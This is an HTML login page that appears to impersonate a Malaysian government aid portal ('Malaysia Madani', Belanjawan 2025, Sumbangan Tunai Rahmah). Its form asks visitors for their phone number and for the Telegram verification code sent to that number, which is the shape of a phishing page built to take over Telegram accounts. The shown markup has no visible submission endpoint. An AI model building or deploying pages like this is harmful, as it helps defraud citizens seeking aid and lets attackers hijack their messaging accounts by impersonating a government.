<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Malaysia Madani</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet" />
</head>
<body class="font-roboto">
  <header class="bg-white shadow">
    <div class="container mx-auto flex justify-between items-center py-4 px-6">
      <!-- Logo and Title Section -->
      <div class="flex items-center">
        <!-- Main Title Image -->
        <div class="ml-4">
          <img src="madani.png" alt="Belanjawan 2025 Malaysia Madani" class="h-12 w-auto" />
        </div>
      </div>

      <!-- Burger Button -->
      <button id="menu-btn" class="text-blue-900 text-3xl lg:hidden" onclick="toggleMenu()">
        <i class="fas fa-bars"></i>
      </button>

       <!-- Main Navigation (for larger screens) -->
       <div id="menu" class="hidden lg:flex items-center space-x-4 lg:space-x-6">
        <input class="border rounded-full px-4 py-2" placeholder="eg. Sumbangan Tunai Rahmah" type="text" />
        <i class="fas fa-search text-xl text-gray-600"></i>
        <a class="text-blue-900 flex items-center" href="#">
          <i class="fas fa-user-circle text-xl mr-2"></i> Daftar Akaun
        </a>
        <a class="text-blue-900 flex items-center" href="#">
          <i class="fas fa-sign-in-alt text-xl mr-2"></i> Log Masuk
        </a>
      </div>
    </div>

    <!-- Dropdown for small screens -->
    <div id="dropdown" class="hidden lg:hidden px-6 py-4 space-y-4">
      <input class="border rounded-full px-4 py-2 w-full" placeholder="eg. Sumbangan Tunai Rahmah" type="text" />
      <a class="block text-blue-900" href="login.html"><i class="fas fa-user-circle text-xl mr-2"></i> Daftar Akaun</a>
      <a class="block text-blue-900" href="login.html"><i class="fas fa-sign-in-alt text-xl mr-2"></i> Log Masuk</a>
    </div>
  </header>
  
  <main class="container mx-auto mt-10 flex justify-center">
   <div class="w-full max-w-md bg-white p-8 shadow-md rounded-md">
    <h1 class="text-2xl font-bold mb-6 text-center">
     Log masuk untuk melihat bantuan yang bersesuaian dengan profil anda
    </h1>
    <form>
        <div class="mb-4">
            <label class="block text-gray-700 font-bold mb-2" for="phone">
              Nombor Telefon
              <span class="text-red-500">*</span>
            </label>
            <div class="relative">
              <input 
                class="border rounded-full w-full py-2 px-4 pl-10" 
                id="phone" 
                placeholder="+60" 
                type="tel" 
                required 
              />
            </div>
          </div>
          
     <div class="mb-4">
      <label class="block text-gray-700 font-bold mb-2" for="password">
       Kod Telegram Yang Dihantar Ke Nombor Anda.
       <span class="text-red-500">
        *
       </span>
      </label>
      <div class="relative">
       <input class="border rounded-full w-full py-2 px-4 pl-10" id="password" placeholder="Sila masukkan kod telegram anda" type="password"/>
       <i class="fas fa-eye absolute right-3 top-3 text-gray-500">
       </i>
      </div>
     </div>
     <div class="mb-4 text-right">
      <a class="text-blue-500" href="#">
       Lupa Kata Laluan?
      </a>
     </div>
     <button class="w-full bg-gradient-to-r from-red-500 to-purple-500 text-white font-bold py-2 rounded-full" type="submit">
      Log Masuk
     </button>
    </form>
    <div class="mt-4 text-center">
     <span>
      Belum mempunyai akaun?
      <a class="text-blue-500" href="#">
       Daftar Akaun
      </a>
     </span>
    </div>
   </div>
  </main>
 </body>
</html>
